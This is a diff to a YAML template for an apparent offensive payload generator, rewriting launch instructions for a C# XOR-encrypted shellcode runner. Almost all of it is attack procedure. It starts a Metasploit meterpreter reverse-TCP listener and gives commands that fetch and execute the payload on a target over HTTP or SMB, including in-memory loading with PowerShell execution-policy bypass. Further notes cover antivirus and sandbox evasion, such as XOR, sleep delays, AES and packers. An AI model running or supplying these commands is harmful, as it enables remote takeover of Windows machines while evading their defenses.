@@ -93,70 +93,38 @@ output:
   launch_instructions: |
     C# Simple XOR Shellcode Runner - Launch Instructions
 
-    Step 1: Start Metasploit Listener
-
-    Start msfconsole and configure the handler:
-
+    Start Listener:
     msfconsole -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST {{ lhost }}; set LPORT {{ lport }}; set ExitOnSession false; exploit -j"
 
-    Or manually in msfconsole:
-
-    use exploit/multi/handler
-    set payload windows/x64/meterpreter/reverse_tcp
-    set LHOST {{ lhost }}
-    set LPORT {{ lport }}
-    set ExitOnSession false
-    exploit -j
-
-    Step 2: Transfer Payload to Target
-
-    Transfer the generated executable to the target Windows system:
-
-    Using Python HTTP server:
+    Transfer and Execute:
     python3 -m http.server 8080
+    On target: powershell -c "IWR -Uri http://{{ lhost }}:8080/{{ output_file }} -OutFile {{ output_file }}; Start-Process {{ output_file }}"
 
-    On target (PowerShell):
-    Invoke-WebRequest -Uri "http://{{ lhost }}:8080/{{ output_file }}" -OutFile "{{ output_file }}"
-
-    Or using SMB:
+    Alternative (SMB):
     impacket-smbserver share . -smb2support
-    On target: copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }}
+    On target: copy \\{{ lhost }}\share\{{ output_file }} {{ output_file }} && {{ output_file }}
 
-    Step 3: Execute on Target
-
-    Simply run the executable:
-    {{ output_file }}
-
-    Or via PowerShell:
-    Start-Process {{ output_file }}
-
-    Step 4: Verify Connection
-
-    Check your Metasploit console for incoming session:
-    Sending stage (200262 bytes) to [target_ip]
-    Meterpreter session 1 opened
+    In-Memory Execution:
+    python3 -m http.server 8080
+    On target: powershell -ep bypass -c "$data = (New-Object System.Net.WebClient).DownloadData('http://{{ lhost }}:8080/{{ output_file }}'); $assem = [System.Reflection.Assembly]::Load($data); [SimpleRunner.Program]::Main(@())"
 
     Notes:
-
-    - Encrypted with XOR key 0x{{ xor_key }} for basic AV evasion
-    - Includes 10-second sleep for sandbox evasion
-    - Uses VirtualAlloc with RWX permissions
-    - Executes shellcode in separate thread
-    - EXITFUNC=thread ensures clean exit
-
-    Troubleshooting:
-
-    - If no connection: Check firewall rules on attacker machine
-    - If AV blocks: Consider additional obfuscation or packing
-    - Payload waits 10 seconds before execution (sandbox evasion)
+    - XOR encrypted with key: 0x{{ xor_key }} (basic AV evasion)
+    - 10-second sleep for sandbox evasion (sandboxes often skip delays)
+    - Uses VirtualAlloc with RWX permissions for shellcode memory allocation
+    - Executes shellcode in separate thread via CreateThread
+    - EXITFUNC=thread ensures clean exit without crashing process
+    - Reverse shell connects to {{ lhost }}:{{ lport }}
     - Requires x64 Windows system
 
-    Alternative Execution:
-
-    Run from memory (no file drop):
-    powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://{{ lhost }}:8080/loader.ps1')"
+    Troubleshooting:
+    - No connection: Check firewall rules on attacker (allow {{ lport }}/tcp)
+    - AV blocks: XOR is weak; consider AES encryption or packing (UPX, Enigma)
+    - Payload waits 10 seconds before execution (by design for sandbox evasion)
+    - Immediate termination: AV likely killed process; check Defender logs
+    - Binary won't run: Windows SmartScreen or AppLocker blocking
 
     Cleanup:
-
-    After testing, remove the payload:
-    Remove-Item {{ output_file }} -Force
+    On target:
+    taskkill /F /IM {{ output_file }} 2>nul
+    del {{ output_file }}
